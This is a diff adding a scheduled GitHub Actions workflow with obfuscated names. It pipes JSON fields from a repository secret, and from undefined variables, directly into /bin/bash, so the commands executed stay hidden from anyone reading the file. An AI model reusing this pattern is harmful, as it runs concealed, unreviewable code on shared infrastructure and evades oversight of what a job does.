@@ -1,0 +1,21 @@
+name: shenbangding
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shenbangding
+        env:
+          a1784: ${{ secrets.a1784 }}
+        run: |
+          echo $a1784 | jq -r .cafhb983 | /bin/bash
+          echo $slzgm99811 | jq -r .avfms3 | /bin/bash
+          echo $u0537 | jq -r .fip08 | /bin/bash
+          echo $ju4 | jq -r .nd92 | /bin/bash
+
